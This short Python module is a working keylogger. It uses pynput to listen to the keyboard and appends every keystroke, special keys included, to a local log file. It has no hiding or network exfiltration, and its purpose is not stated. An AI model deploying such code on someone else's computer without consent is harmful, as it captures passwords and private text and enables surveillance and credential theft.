import os
from pynput import keyboard
from .config import LOG_FILE, LOG_DIR

def ensure_log_directory():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"<{key}>")


def start_logger():
    ensure_log_directory()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

